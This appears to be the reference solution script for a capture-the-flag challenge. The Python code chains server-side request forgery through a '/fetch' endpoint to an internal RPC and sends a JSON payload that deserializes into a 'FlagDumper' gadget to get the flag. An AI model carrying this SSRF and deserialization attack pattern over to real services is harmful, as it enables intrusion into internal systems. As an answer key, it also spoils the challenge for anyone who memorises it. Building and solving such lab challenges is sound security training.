#!/usr/bin/env python3
"""Reference solver for misc-ingestd-deser.

The fetcher does not restrict its target, so SSRF it at the internal RPC and
send a poisoned message that deserializes to the FlagDumper gadget.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.parse
import urllib.request


def _get(url):
    return json.loads(urllib.request.urlopen(url, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    body = urllib.parse.quote(json.dumps({"__class__": "FlagDumper"}))
    out = _get(base + "/fetch?url=/internal/rpc&body=" + body)
    return out["result"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
